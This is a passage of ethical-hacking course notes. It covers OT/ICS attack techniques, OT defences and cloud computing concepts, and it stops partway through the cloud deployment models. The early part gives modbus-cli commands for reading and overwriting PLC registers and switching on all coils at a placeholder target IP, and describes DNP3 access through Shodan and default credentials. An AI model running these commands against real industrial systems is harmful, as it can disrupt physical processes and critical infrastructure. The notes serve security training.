						- After identifying vulnerable PLCs using Shodan, install modbus-cli with the following command: gem install modbus-cli
					- Step 3: Understand Data Types:
						- Before exploiting PLCs with modbus-cli, you must understand the data types used for reading values. These data types have two types of addresses: Schneider and Modicon. A Schneider address starts with %M before the address.
					- Step 4: Read Register Values:
						- To read register values from the identified devices, use the following commands:
						- Using Schneider address: modbus read <Target IP> %MW100 10
						- Using Modicon address: modbus read <Target IP> 400101 10
						- These commands retrieve ten words from the registers.
					- Step 5: Manipulate Register Values:
						- You can modify register values using the following commands:
							- modbus write <Target IP> %MW100 2 2 2 2 2 2 2 2
							- modbus write <Target IP> 400101 2 2 2 2 2 2 2 2
						- After executing these commands, the first eight register values will be replaced with 2.
					- Step 6: Read Coil Values:
						- Retrieve coil values (which store ON/OFF states as Boolean values) using the following commands:
							- modbus read <Target IP> 101 10
							- modbus read <Target IP> %M100 10
					- Step 7: Manipulate Coil Values:
						- To turn on all coils using modbus-cli, execute the following commands:
							modbus write <Target IP> 101 1 1 1 1 1 1 1 1 1 1
							modbus write <Target IP> %M100 1 1 1 1 1 1 1 1 1 1
						- After running these commands, checking the coil values will show all coils set to 1.
					- Step 8: Capture Data into an Output File:
						- You can save SCADA data for analysis and testing using the following commands:
						- Capture register values into a file:
							- modbus read --output SCADAregisters.txt <Target IP> 400101 200
							- modbus read --output SCADAregisters.txt <Target IP> %MW100 200
						- Capture coil values into a file:
							- modbus read --output SCADAcoils.txt <Target IP> 101 100
							- modbus read --output SCADAcoils.txt <Target IP> %M100 100
			- Gaining and Maintaining Remote Access:
				- The information-gathering and vulnerability-scanning phases allow attackers to survey the OT environment and identify vulnerabilities that help them gain remote access to industrial control systems. For example, attackers can exploit weaknesses in industrial protocols or inject malware to launch targeted attacks and access these systems. Once inside, they can manipulate and alter industrial control operations, causing both physical and financial damage to the organization. Additionally, attackers use compromised devices as platforms to launch further attacks on other connected systems.
				- After gaining remote access, attackers employ various techniques to maintain their foothold and carry out further exploitation. They remain undetected by clearing logs, updating firmware, and injecting rootkits to ensure persistent access. Moreover, they can modify firmware on devices such as PLCs, enabling them to monitor and control critical operations within the target system.
			- Gaining Remote Access Using DNP3:
				- Internet-based control systems are widely used in industries such as power plants, manufacturing, and construction. These systems are designed for remote monitoring and control but are often configured with direct Internet access, lack proper firewall protections, or use default credentials. Attackers can exploit poorly secured networks and weak/default passwords to gain unauthorized access to industrial systems. Many default credentials are publicly available online, and weak passwords can be easily brute-forced.
				- Attackers often use online tools like Shodan to scan open ports and services on target ICS devices. Once an open port is identified, they exploit vulnerabilities to obtain remote access. For example, when targeting ICS protocols such as DNP3 (port 20000), attackers can perform a port scan using Shodan, revealing open ports and associated vulnerabilities. By selecting an open port, they are directed to the system’s login page, where they can gain access using default credentials or brute-force techniques.
			- OT Hacking Tools:
				- Attackers use OT hacking tools to identify industrial control systems connected to a target network, detect legacy software installed on those devices, find vulnerable ports and services, and exploit unsecured or unencrypted communication protocols. These tools enable various types of attacks on industrial systems and networks. This section explores several OT hacking tools.
				- OT Hacking Tools:
					- Below are some commonly used tools that attackers leverage to compromise OT systems and networks:
					- mbtget (github.com): mbtget is a command-line tool written in Perl for executing Modbus transactions. It enables attackers to interact with both the TCP and RTU versions of the Modbus protocol via the MBclient object, allowing them to target industrial control systems (ICS) and networks.
					- CSET (github.com)
					- Attkfinder (gitlab.com)
					- ICSREF (github.com)
					- ICSFuzz (github.com)
					- ISF (github.com)
	- OT Attack Countermeasures:
		- This section covers various OT security measures, common OT vulnerabilities and their solutions, security strategies based on the Purdue model, international OT security organizations, and available OT security solutions and tools. By implementing these security measures, organizations can establish effective protection mechanisms to safeguard critical industrial infrastructure and associated IT systems from cyber threats.
		- How to Defend Against OT Hacking:
			- To protect against OT hacking, implement the following security measures:
			- Risk Management & Assessment: Regularly conduct risk assessments and audits to reduce exposure and validate security controls. Maintain an asset register to track outdated and unsupported systems.
			- Network Security: Secure network perimeters to prevent unauthorized access. Use DMZ connections between ICS and corporate networks for secure communication. Deploy firewalls, intrusion detection/prevention systems (IDPS), and network traffic monitoring tools with deep packet inspection (DPI). Restrict traffic using rate-limiting, whitelisting, and access controls.
			- System Hardening & Patch Management: Regularly update and patch OT hardware, software, and vulnerabilities released by manufacturers. Disable unused ports, services, and functionalities. Secure industrial protocols (e.g., Modbus, DNP3, OPC) with encryption and authentication.
			- Access Control & Authentication: Enforce least privilege access and secure remote access with VPNs, multifactor authentication (MFA), and encryption. Change default passwords and enforce strong password policies. Implement PKI systems for traffic validation and encryption.
			- Threat Detection & Monitoring: Continuously monitor logs and network data for anomalies. Check DNS logs for unauthorized access. Deploy OT-aware intrusion detection systems (IDSs) and flow-measurement systems to detect threats early.
			- Secure Coding & Application Security: Implement secure coding practices, input validation, and sanitization to prevent attacks (e.g., buffer overflow, XSS, SQL injection). Use library calls instead of external processes. Secure ICS applications with prepared statements and parameterized queries.
			- Incident Response & Business Continuity: Develop and implement incident response and continuity plans. Employ security red teams to uncover vulnerabilities in critical infrastructure.
			- Employee Training & Awareness: Educate employees on security policies, emerging threats, and best practices.
			- Endpoint Protection: Install and maintain endpoint protection solutions against malware, ransomware, and cyber threats.
			- Supply Chain & Vendor Security: Ensure ICS vendors design systems with access restrictions and cryptographic signatures for updates. Validate security in production and management systems.
		- OT Vulnerabilities and Solutions:
			- Vulnerabilities in industrial systems such as ICS/SCADA, PLCs, and RTUs pose significant threats to critical infrastructure. Organizations must implement appropriate security controls and mechanisms to protect these systems from cyber threats.
			- Below are some of the most common OT vulnerabilities and their solutions:
				- Publicly Accessible OT Systems:
					- Implement multi-factor authentication (MFA).
					- Use enterprise-grade firewalls and secure remote access solutions.
					- Develop and regularly test incident response plans.
				- Insecure Remote Connections:
					- Enforce strong multi-factor authentication (MFA) and robust password policies.
					- Apply security patches promptly.
					- Implement Role-Based Access Control (RBAC) to manage remote access permissions.
				- Missing Security Updates:
					- Test applications in a sandbox environment before deploying them.
					- Implement firewalls and apply device hardening techniques.
				- Weak Passwords:
					- Use distinct username conventions for corporate IT and OT networks.
					- Change default credentials during installation.
					- Conduct security audits to ensure compliance with strong password policies for both IT and OT networks.
				- Insecure Firewall Configuration:
					- Configure firewalls securely.
					- Define and enforce access control lists (ACLs) on firewalls.
				- OT Systems Integrated into the Corporate IT Network:
					- Segregate corporate IT and OT devices.
					- Establish a demilitarized zone (DMZ) for IT-OT connections.
					- Continuously monitor DMZ activity.
				- Insufficient Protection of Corporate IT Networks from OT Systems:
					- Restrict IT/OT network access based on business requirements.
					- Implement a secure gateway between OT and IT networks.
					- Conduct regular risk assessments.
				- Lack of Segmentation within OT Networks:
					- Clearly separate critical and non-critical systems.
					- Implement a zoning model with a defense-in-depth strategy.
					- Adopt a zero-trust security model that assumes no implicit trust.
				- Lack of Encryption and Authentication in Wireless OT Networks:
					- Use strong wireless encryption protocols.
					- Implement industry-standard cryptographic algorithms.
					- Perform regular security audits.
				- Unrestricted Outbound Internet Access from OT Networks:
					- Conduct formal risk assessments.
					- Closely monitor and segregate OT systems from external access.
					- Maintain a separate repository for downloading security updates outside the OT network.
		- Secure an IT/OT Environment:
			- IT/OT convergence is increasingly being adopted in industries such as traffic control systems, power plants, and manufacturing companies. However, these integrated systems are often targeted by attackers seeking to exploit vulnerabilities and launch cyber-attacks.
			- According to the Purdue model, the IT/OT environment is structured into multiple levels, each of which requires appropriate security measures to ensure protection.
			- The table below outlines various attacks targeting different Purdue levels within an IT/OT environment, the associated risks, and the security controls necessary to strengthen the network against cyber threats.
		- Implementing a Zero-Trust Model for ICS/SCADA:
			- Operational Technology (OT) networks are increasingly attractive targets for attackers aiming to disrupt Industrial Control Systems (ICS) infrastructure. To stay ahead of threats, organizations must implement robust security controls and proactively address vulnerabilities to prevent sophisticated attacks. Most ICS networks rely on legacy systems or hardware that lack modern security measures and access controls, making them particularly susceptible to cyber threats. Implementing a Zero-Trust model in an ICS network enables organizations to establish strong access management for legacy systems and the network while ensuring comprehensive visibility and validation of all applications, users, and devices.
			- Steps to Implement a Zero-Trust Model in an ICS Network
				- Step 1: Define the Network:
					- - As an organization’s attack surface is constantly evolving, securing the entire infrastructure is challenging. Implementing a Zero-Trust approach begins with defining the attack surface—identifying critical organizational assets, vulnerable data, and essential applications within control centers or factory floors.
				- Step 2: Map the Traffic:
					- Network traffic must be thoroughly mapped and documented to understand how devices and resources interact. Traffic mapping provides OT teams with full network visibility, helping them determine necessary security controls to protect critical data and applications.
				- Step 3: Architect the Network:
					- Once traffic flows are understood, security analysts can design a Zero-Trust Architecture (ZTA) based on business requirements. This process typically begins with deploying a Next-Generation Firewall (NGFW) to act as a segmentation gateway, protecting critical assets. This step also introduces additional access-control layers and internal evaluation mechanisms.
				- Step 4: Develop a Zero-Trust Policy:
					- After architecting the network, a Zero-Trust (ZT) policy should be implemented to whitelist users and devices. This policy defines who can access what resources, when, and why within the ICS network, ensuring that only authorized entities are granted access.
				- Step 5: Monitor and Maintain:
					- In the final step, security analysts must ensure that the Zero-Trust Architecture (ZTA) continuously monitors network traffic as intended. This ongoing monitoring provides valuable insights into network activity and ensures that security updates and patches are applied to all network devices as needed.
		- International OT Security Organizations:
			- As Operational Technology (OT) becomes more widely integrated with Information Technology (IT), security researchers must adopt stricter security measures to protect OT networks. Several global cybersecurity organizations are dedicated to enhancing the security resilience of critical infrastructure by providing security policies, insights, and best practices.
			- Below are some key international organizations that alert companies about threats and offer IT/OT solutions to safeguard OT industries from cyberattacks.
				- Operational Technology Cybersecurity Coalition (OTCC):
					- The Operational Technology Cybersecurity Coalition (OTCC) is an industry-led initiative aimed at strengthening the security of OT environments. OT systems—including Industrial Control Systems (ICS), SCADA systems, and other critical infrastructure—are increasingly vulnerable to cyber threats. The OTCC addresses these challenges through collaboration, information sharing, and the development of best practices.
				- Operational Technology Information Sharing and Analysis Center (OT-ISAC):
					- The Operational Technology Information Sharing and Analysis Center (OT-ISAC) serves as a central hub for sharing threat intelligence among OT industries, including the energy and water utility sectors. The organization provides tools and techniques for secure information exchange across the IT/OT spectrum, helping industries defend against malicious intrusions. By collaborating with various information-sharing centers, OT-ISAC gathers data on emerging threats and delivers timely solutions to enhance industrial security.
				- North American Electric Reliability Corporation (NERC):
					- The North American Electric Reliability Corporation (NERC) is a nonprofit international regulatory authority focused on reducing risks to the reliability and security of the electric grid. NERC:
						- Develops and enforces reliability standards
						- Conducts seasonal and long-term reliability assessments
						- Monitors the bulk power system for threats
						- Provides training and certification for industry personnel
				- Industrial Internet Security Framework (IISF):
					- The Industrial Internet Security Framework (IISF) is designed to mitigate risks from both internal and external cyber threats that could disrupt industrial production. Its primary objectives include:
						- Identifying and monitoring IT/OT-integrated operations
						- Prioritizing potential threats to industrial systems
						- Establishing security best practices to minimize cyber risks
				- ISA/IEC 62443 – Industrial Automation Security Standards:
					- The International Society of Automation (ISA) and the International Electrotechnical Commission (IEC) developed ISA/IEC 62443, a flexible security framework for Industrial Automation and Control Systems (IACS). This standard:
						- Defines security requirements for industrial components such as embedded devices, network components, and software applications
						- Addresses vulnerabilities in industrial automation systems
						- Provides security levels to mitigate threats without relying on additional countermeasures
		- OT Security Solutions:
			- The industrial and corporate sectors are rapidly digitizing their operational value chains, increasing OT device exposure to a broader range of Internet-based threats. However, the cost of managing security in heavy industrial sectors is often overlooked, leading to significant security challenges. To mitigate risks, it is crucial for industrial sectors to invest in comprehensive cybersecurity programs and solutions.
			- Cybersecurity professionals should deploy security solutions by carefully assessing current cybersecurity challenges and requirements. These solutions should align with industry trends and be integrated with suitable operational changes. As a result, both established OEM providers and start-ups have developed innovative tactics and technologies to safeguard the OT environment. Due to the decentralized nature of heavy industries, security solutions should be incorporated into all technology-driven decisions across both IT and OT systems. Additionally, a second line of defense can be implemented using Information Risk Management (IRM), while some industries further reinforce security by adopting a third line of defense through internal audit functions.
			- Emerging Technology Solutions for OT Security
				- Organizations employ various advanced technologies to protect the OT environment. Some of the key solutions include:
				- Firewalls:
					- Firewalls monitor and control incoming and outgoing network traffic to enhance security. They play a critical role in inspecting traffic between OT and IT networks, identifying and blocking new threats. By using firewalls, attackers can be restricted from moving between networks after compromising a system. It is also advisable to place critical assets and systems in a DMZ, separate from SCADA systems.
					- Recommended tools: FortiGate Rugged Next-Generation Firewalls, OTIFYD Next-Gen OT Firewall.
				- Unified Identity and OT Access Management:
					- Access management centralizes user access control by adding, securing, modifying, and removing user permissions for OT systems. This data is integrated with the organization’s identity management system to ensure strong authentication. By enforcing the principle of least privilege for superuser accounts, access management minimizes attack risks and enables security personnel to trace critical assets and identify potential attack sources.
					- Recommended tools: Claroty, MetaDefender IT-OT Access.
				- Asset Inventory and Device Authorization:
					- Asset inventory solutions ensure that only authorized devices connect to the OT network while detecting all connected devices. These tools identify vulnerabilities based on device manufacturer, version, and type. Additionally, they help pinpoint faulty devices and improve network efficiency.
					- Recommended tools: SCADAfence, OTbase, Guardian, Dragos.
				- OT Network Monitoring and Anomaly Detection:
					- OT network monitoring tools continuously oversee industrial systems to track traffic in a non-invasive manner. They employ anomaly detection techniques to identify malicious or unexpected activities. Many of these tools utilize machine learning algorithms to detect and respond to security threats efficiently.
					- Recommended tools: iSID, Rhebo OT Security.
				- Decoys to Deceive Attackers:
					- Decoys, also known as honeypots, use deception technology to create traps that lure attackers, revealing their presence and activities. This additional layer of defense helps protect industrial networks from intrusion attempts.
					- Recommended tools: Attivo Networks ThreatDefend, Conpot, GasPot.
		- OT Security Tools:
			- Below are various tools used to secure OT systems and networks:
			- Flowmon (www.flowmon.com): Flowmon enables manufacturers and utility companies to maintain the reliability of their industrial networks, minimizing downtime and service disruptions. It achieves this through continuous monitoring and anomaly detection, allowing for the rapid identification of malfunctioning devices and security incidents such as cyber espionage, zero-day threats, and malware. By detecting these issues early, Flowmon helps organizations respond and remediate threats as quickly as possible.
			- Tenable OT Security (www.tenable.com)
			- Nozomi Networks (www.nozominetworks.com)
			- Forescout (www.forescout.com)
			- FortiGuard (www.fortinet.com)
			- RAM2 (www.otorio.com)


--------------------------------------------------

# Cloud Computing

- Cloud Computing Concepts:
	- Cloud computing provides a range of services and applications over the Internet, allowing users to access software and hardware managed by third parties at remote locations. Major cloud service providers include Google, Amazon, and Microsoft.
	- This section introduces cloud computing, its various service types, the division of responsibilities, cloud deployment models, the NIST reference architecture and its benefits, cloud storage architecture, and major cloud service providers.
	- Introduction to Cloud Computing:
		- Cloud computing is the on-demand delivery of IT capabilities, where IT infrastructure and applications are provided to subscribers as metered services over networks. Examples of cloud solutions include Gmail, Facebook, Dropbox, and Salesforce.
	- Characteristics of Cloud Computing:
		- Below are the key characteristics of cloud computing that make it an attractive choice for many businesses today:
		- On-demand self-service: Cloud service providers offer resources such as computing power, storage, and networking on demand, without requiring human interaction with the provider.
		- Distributed storage: Cloud-based distributed storage enhances scalability, availability, and reliability. However, it can also raise security and compliance concerns.
		- Rapid elasticity: Cloud computing allows for instant provisioning and scaling of resources based on demand. To consumers, these resources appear unlimited and can be acquired in any quantity at any time.
		- Automated management: Cloud automation minimizes user involvement, speeding up processes while reducing labor costs and the risk of human error.
		- Broad network access: Cloud resources are accessible via the internet using standard protocols across various devices, including laptops, mobile phones, and personal digital assistants (PDAs).
		- Resource pooling: Cloud providers use multi-tenant environments where physical and virtual resources are dynamically allocated and reallocated based on consumer demand.
		- Measured service: Cloud systems follow a “pay-per-use” model. Customers are billed based on their usage of storage, processing power, and bandwidth. Providers monitor, control, and report resource consumption transparently.
		- Virtualization technology: Virtualization enables the efficient scaling of resources in the cloud, surpassing the capabilities of traditional, non-virtualized environments.
	- Limitations of Cloud Computing:
		- Despite its advantages, cloud computing has several limitations:
		- Limited control and flexibility for organizations
		- Susceptibility to outages and technical issues
		- Security, privacy, and compliance concerns
		- Contractual constraints and vendor lock-ins
		- Dependence on network connectivity
		- Increased vulnerability to cyberattacks due to online exposure
		- Challenges in migrating from one service provider to another
	- Types of Cloud Computing Services:
		- Cloud computing services are broadly categorized into the following types:
		- Infrastructure-as-a-Service (IaaS):
			- IaaS provides on-demand access to fundamental IT resources, such as computing power, virtualization, data storage, and networking. This service offers virtual machines and other abstracted hardware and operating systems (OSs), which can be managed through a service application programming interface (API). Since cloud service providers handle the underlying infrastructure, subscribers can reduce costs related to hardware, human capital, and maintenance. Examples of IaaS providers include Amazon EC2, Microsoft Azure, and Rackspace.
			- Advantages:
				- Scalable infrastructure to meet demand
				- High availability and guaranteed uptime
				- Automation of administrative tasks
				- Elastic Load Balancing (ELB) for efficient resource distribution
				- Policy-based services for streamlined operations
				- Global accessibility for remote users
			- Disadvantages:
				- Higher security risks due to third-party management
				- Potential performance issues and slow connection speeds
		- Platform-as-a-Service (PaaS):
			- PaaS is a cloud computing service that provides an environment for developing, managing, and deploying applications. Subscribers do not need to purchase or manage the underlying software and infrastructure but retain control over deployed applications and, in some cases, application hosting environment configurations. This service offers development tools, configuration management, and on-demand deployment platforms, enabling users to build custom applications. Examples of PaaS providers include Google App Engine, Salesforce, and Microsoft Azure.
			- Advantages:
				- Simplified deployment process
				- Prebuilt business functionalities
				- Lower security risks compared to IaaS
				- Access to an active developer community
				- Cost-effective pay-per-use model
				- Scalable infrastructure
			- Disadvantages:
				- Vendor lock-in, limiting flexibility
				- Data privacy concerns
				- Challenges integrating with existing system applications
		- Software-as-a-Service (SaaS):
			- SaaS delivers application software to users over the Internet on a subscription or pay-per-use basis. The service provider manages the software, infrastructure, and security, eliminating the need for users to install or maintain applications locally. Revenue models for SaaS may include subscriptions, advertisements, or shared multi-user access. Common SaaS examples include Google Docs, Google Calendar, Salesforce CRM, and FreshBooks.
			- Advantages:
				- Cost-effective with minimal upfront investment
				- Easy administration and maintenance
				- Accessible from anywhere with an Internet connection
				- High compatibility, requiring no specialized hardware or software
			- Disadvantages:
				- Security and latency concerns due to cloud-based access
				- Full dependency on an Internet connection
				- Difficulty in switching between SaaS vendors
		- Identity-as-a-Service (IDaaS):
			- IDaaS is a cloud computing service that provides authentication and identity management solutions for enterprises, managed by a third-party provider. It offers services such as Single Sign-On (SSO), Multi-Factor Authentication (MFA), Identity Governance and Administration (IGA), access management, and intelligence collection. These services enhance security and simplify access to sensitive data, whether on-premises or in the cloud. Examples of IDaaS providers include OneLogin, Centrify Identity Service, Microsoft Azure Active Directory, and Okta.
			- Advantages:
				- Cost-effective identity management
				- Enhanced security through centralized authentication
				- Simplified regulatory compliance
				- Reduced administrative overhead
				- Centralized user account management
			- Disadvantages:
				- A single server failure may disrupt authentication services or overload backup servers
				- Vulnerable to account hijacking attacks
		- Security-as-a-Service (SECaaS):
			- SECaaS is a cloud-based security model that integrates security services into an organization’s IT infrastructure in a cost-effective manner. Built on the SaaS model, SECaaS eliminates the need for physical security hardware, significantly reducing operational costs. It provides services such as penetration testing, authentication, intrusion detection, anti-malware protection, and security incident and event management (SIEM). Examples of SECaaS providers include eSentire MDR, Switchfast Technologies, OneNeck IT Solutions, and Foundstone Managed Security Services.
			- Advantages:
				- Cost-effective security solutions
				- Reduced complexity in managing security infrastructure
				- Continuous protection with real-time updates
				- Access to industry-leading security expertise
				- Latest and updated security tools
				- Rapid user provisioning and deployment
				- Improved agility and scalability
				- More time to focus on core business operations
			- Disadvantages:
				- Increased exposure to cyber threats and vulnerabilities
				- Uncertain risk profile due to third-party management
				- Potential security risks from insecure APIs
				- Limited customization to meet specific business needs
				- Susceptibility to account hijacking attacks
		- Container-as-a-Service (CaaS):
			- CaaS is a cloud computing model that provides container and cluster management services to subscribers. It enables the virtualization of container engines, as well as the management of containers, applications, and clusters through a web portal or an API. Using CaaS, subscribers can develop highly scalable containerized applications in the cloud or on-premises. CaaS combines features of both IaaS and PaaS. Examples of CaaS providers include Amazon EC2 and Google Kubernetes Engine (GKE).
			- Advantages:
				- Streamlined development of containerized applications
				- Pay-per-resource pricing model
				- Increased application quality and reliability
				- Portable and consistent application development
				- Cost-effective with efficient resource utilization
				- Minimal resource consumption
				- Application container crashes do not affect other containers
				- Enhanced security and patch management
				- Faster bug resolution
				- High scalability
			- Disadvantages:
				- High operational overhead for managing containers
				- Responsibility for platform deployment falls on the developer
		- Function-as-a-Service (FaaS):
			- FaaS is a cloud computing model that enables developers to build, run, and manage application functions without the complexity of maintaining infrastructure, following a serverless architecture. This model is widely used in microservices-based application development. FaaS provides on-demand functionality, automatically powering down the supporting infrastructure when not in use, reducing costs. It is commonly used for data processing, IoT applications, mobile and web applications, and batch-and-stream processing. Examples of FaaS providers include AWS Lambda, Google Cloud Functions, Microsoft Azure Functions, and Oracle Functions.
			- Advantages:
				- Pay-per-use pricing model reduces costs
				- Minimal infrastructure management
				- Efficient security updates and maintenance
				- Easy deployment and scaling
				- High scalability for dynamic workloads
			- Disadvantages:
				- Potentially high latency for cold starts
				- Memory limitations impacting performance
				- Challenges in monitoring and debugging
				- Unstable tools and frameworks
				- Vendor lock-in limiting flexibility
		- Anything-as-a-Service (XaaS):
			- Anything-as-a-Service (XaaS), also known as Everything-as-a-Service, is a cloud computing and remote-access model that delivers various services over the Internet based on user demand. These services can include digital products such as tools, applications, and technologies, as well as non-digital services like food delivery, transportation, and medical consultations. XaaS operates on a pay-per-use basis and is not available for purchase or licensing as a regular product.
			- Beyond common cloud services such as Software-as-a-Service (SaaS), Platform-as-a-Service (PaaS), and Infrastructure-as-a-Service (IaaS), XaaS also encompasses:
				- Network-as-a-Service (NaaS)
				- Storage-as-a-Service (STaaS)
				- Testing-as-a-Service (TaaS)
				- Malware-as-a-Service (MaaS)
				- Disaster-Recovery-as-a-Service (DRaaS)
			- XaaS enables secure and scalable services for various industries, including customer relationship management (CRM), cloud computing, and directory services. Examples of XaaS providers include NetApp, AWS Elastic Beanstalk, Heroku, and Apache Stratos.
			- Advantages:
				- High scalability to meet demand
				- Accessible from any location and device
				- Fault tolerance with reduced redundancy risks
				- Lower capital expenditure (CapEx)
				- Enhances business operations with rapid elasticity and resource sharing
			- Disadvantages:
				- Service outages due to dependence on Internet connectivity
				- Performance issues from high resource utilization
				- Complexity in troubleshooting and managing services
		- Firewall-as-a-Service (FWaaS):
			- FWaaS is a cloud-based security service that protects users and organizations from internal and external cyber threats by filtering network traffic. It offers advanced security features such as malware detection, packet filtering, network analysis, and IPsec encryption. FWaaS enhances data security while simplifying network protection across cloud environments. Examples of FWaaS providers include Zscaler Cloud Firewall, SecurityHQ, Secucloud, Fortinet, Cisco, and Sophos.
			- Advantages:
				- Blocks malicious web traffic and cyber threats
				- Secures multiple cloud deployments
				- Enables standardized policy implementation across networks
				- Improves network visibility and monitoring
				- Enhances reliability with cloud-based security infrastructure
				- Simplifies architecture and maintenance
			- Disadvantages:
				- Resistance to adoption in traditional IT environments
				- Potential network latency issues
		- Desktop-as-a-Service (DaaS):
			- DaaS is a cloud computing service that provides on-demand virtual desktops and applications to subscribers. Cloud service providers manage the infrastructure, computing resources, data storage, backups, patching, and maintenance. DaaS is typically offered as a multi-tenant subscription service, with pricing based on a pay-as-you-go model. Examples of DaaS providers include Amazon WorkSpaces, Citrix Managed Desktops, and Azure Virtual Desktop.
			- Advantages:
				- Global accessibility for remote users
				- Simplified desktop and application management
				- Reduced downtime with cloud-based recovery options
				- Cost-effective compared to traditional desktop management
				- High flexibility for businesses and employees
				- Scalable infrastructure to meet demand
			- Disadvantages:
				- Security risks due to third-party management
				- Dependence on network connectivity for access
				- High licensing costs for enterprise use
		- Mobile Backend-as-a-Service (MBaaS):
			- MBaaS is a cloud computing service that enables app developers to connect front-end applications to backend infrastructure through application programming interfaces (APIs) and software development kits (SDKs). This service reduces the time spent on backend development by providing essential features such as user management, push notifications, cloud storage, database management, and geolocation services. Examples of MBaaS providers include Google Firebase, AWS Amplify, Kinvey, Apple CloudKit, and Backendless Cloud.
			- Advantages:
				- Faster development with prebuilt backend services
				- High flexibility for various app types and industries
				- Scalable infrastructure to handle growing user bases
				- Cost-effective pay-as-you-go pricing model
			- Disadvantages:
				- Security vulnerabilities in cloud-based services
				- High initial setup and integration costs
		- Machines-as-a-Service (MaaS) Business Model:
			- Machines-as-a-Service (MaaS), also known as Equipment-as-a-Service (EaaS), is a cloud-based business model that allows manufacturers to sell or lease machines to clients while receiving a percentage of the revenue generated by those machines. This model benefits both manufacturers and clients by providing real-time tracking, predictive maintenance, and optimized machine utilization. MaaS enables companies to access high-end machinery without large upfront investments.
			- Advantages:
				- Low initial investment cost for clients
				- Enhanced adaptability with usage-based pricing
				- Reliable and cost-effective revenue stream for manufacturers
				- Improved product quality and increased production efficiency
			- Disadvantages:
				- High maintenance and repair costs for manufacturers
				- Potential job displacement as machines replace human workers
	- Shared Responsibilities in Cloud:
		- In cloud computing, the separation of responsibilities between subscribers and service providers is essential. This separation helps prevent conflicts of interest, illegal activities, fraud, abuse, and errors. It also aids in identifying security control failures, such as information theft, security breaches, and the evasion of security measures. Additionally, it limits the influence of any single individual and ensures that no conflicting responsibilities exist.
		- There are three main types of cloud services: IaaS, PaaS, and SaaS. Understanding the limitations of each cloud service delivery model is crucial when accessing specific clouds and their frameworks. The figure below illustrates the division of responsibilities in cloud service delivery models.
	- Cloud Deployment Models:
		- Selecting a cloud deployment model depends on an enterprise's requirements. Cloud services can be deployed in different ways based on the following factors:
			- Location of cloud computing services
			- Security requirements
			- Sharing of cloud resources
			- Ability to manage some or all cloud services
			- Customization capabilities
		- The Four Standard Cloud Deployment Models:
		- Public Cloud:
			- In this model, the provider makes services such as applications, servers, and data storage available to the public over the Internet. The provider is responsible for the creation, management, and maintenance of the public cloud and its IT resources. Public cloud services may be free or follow a pay-per-usage model (e.g., Amazon Elastic Compute Cloud (EC2), Google App Engine, Microsoft Azure, IBM Bluemix).
			- Advantages:
				- Simplicity and efficiency
				- Cost-effective
				- Reduced downtime (quick recovery in case of server crashes, restarts, or reconfiguration)
				- No maintenance required (hosted off-site by the provider)
				- No long-term contracts or commitments
			- Disadvantages:
				- Security is not guaranteed
				- Limited control (third-party providers manage infrastructure and services)
				- Potential latency (dependent on Internet speed and data transfer rates)
		- Private Cloud:
			- A private cloud, also known as an internal or corporate cloud, is a cloud infrastructure operated by a single organization and implemented within a corporate firewall. Organizations deploy private cloud infrastructures to retain full control over corporate data (e.g., BMC Software, VMware vRealize Suite, SAP Cloud Platform).
			- Advantages:
				- Enhanced security (services are dedicated to a single organization)
				- Greater control over resources (managed internally by the organization)
				- High performance (deployment within the firewall ensures fast data transfer rates)
				- Customizable hardware, network, and storage configurations (as the organization owns the infrastructure)
				- Easier compliance with regulatory standards such as Sarbanes-Oxley, PCI DSS, and HIPAA
			- Disadvantages:
				- High costs
				- Requires on-site maintenance and management
		- Community Cloud:
			- A community cloud is a multi-tenant infrastructure shared among organizations within a specific community that have common computing concerns, such as security, regulatory compliance, performance requirements, and jurisdiction. The community cloud can be hosted either on-premises or off-premises and may be governed by the participating organizations or a third-party managed service provider (e.g., Cisco Cloud Solutions, Salesforce Health Cloud).
			- Advantages:
				- More cost-effective than a private cloud
				- Flexible to meet the community’s specific needs
				- Ensures compliance with legal and regulatory requirements
				- Highly scalable
				- Enables resource sharing among organizations via the Internet
			- Disadvantages:
				- Resource competition among users
				- Difficulty in accurately predicting resource requirements
				- Lack of a clear legal entity in case of liability issues
				- Moderate security risks (other tenants may potentially access data)
				- Trust and security concerns among tenants
		- Hybrid Cloud:
			- A hybrid cloud is a cloud environment that combines two or more cloud types (private, public, or community) while maintaining their distinct identities. These clouds are integrated to leverage the benefits of multiple deployment models. In this model, an organization manages some resources in-house while outsourcing others to external providers (e.g., Microsoft Azure, Zymr, Parangat Cloud Computing, Logicalis).
			- Example: An organization may perform critical activities (e.g., handling operational customer data) on a private cloud while using a public cloud for non-critical activities.
			- Advantages:
				- High scalability (leverages both public and private clouds)
				- Provides secure yet scalable public resources
				- Offers a high level of security through private cloud integration
				- Enables cost reduction and management based on requirements
			- Disadvantages:
				- Network-level communication issues may arise due to the combination of public and private clouds
				- Achieving data compliance can be challenging
				- Organizations rely on internal IT infrastructure during outages (requiring redundancy across data centers)
				- Complex Service Level Agreements (SLAs)
		- Multi-Cloud:
			- A multi-cloud is a dynamic, heterogeneous environment that combines workloads across multiple cloud vendors. It is managed through a unified interface to support long-term business objectives. A multi-cloud strategy utilizes multiple computing and storage services from different cloud providers, distributing cloud assets, software, and applications across various hosting environments. Multi-cloud environments can be all-private, all-public, or a combination of both. Organizations adopt multi-cloud environments to enhance computing power, expand storage capabilities, and mitigate the risks of data loss and downtime (e.g., Microsoft Azure Arc, Google Cloud Anthos).
			- Advantages:
				- High reliability and low latency
				- Flexible to meet diverse business needs
				- Optimized cost-performance and risk mitigation
				- Reduced risk of Distributed Denial-of-Service (DDoS) attacks
				- Increased storage availability and computing power
				- Lower likelihood of vendor lock-in
			- Disadvantages:
				- Multi-cloud system failures can impact business agility
				- Using multiple providers may lead to redundancy
				- Security risks due to a larger and more complex attack surface
				- Increased operational overhead
		- Other Cloud Deployment Models:
			- Distributed Cloud:
				- A distributed cloud is a centralized cloud environment composed of geographically dispersed public or private clouds, all managed through a single control plane. This model allows end users to access data from anywhere as if it were hosted on a local data center, providing edge computing capabilities to enhance data privacy and comply with local governance policies. Distributed cloud services can be deployed in various locations, including network edges, operator edges, customer edges, and local data centers, based on specific requirements. This model supports automation in applications such as artificial intelligence (AI), machine learning (ML), and the Internet of Things (IoT) (e.g., Google Distributed Cloud, Cloudflare CDN).
				- Advantages:
					- High performance
					- Reduced latency
					- Greater management and operational consistency compared to hybrid and multi-cloud models
					- Supports on-site modernization
					- Provides edge computing capabilities
					- Enables on-premises data processing
					- Ensures stringent data security
					- Supports automation applications (AI, ML, IoT, etc.)
				- Disadvantages:
					- Potential security vulnerabilities
					- High deployment costs (network infrastructure investment)
					- Limited software support
					- Complex troubleshooting
			- Poly Cloud:
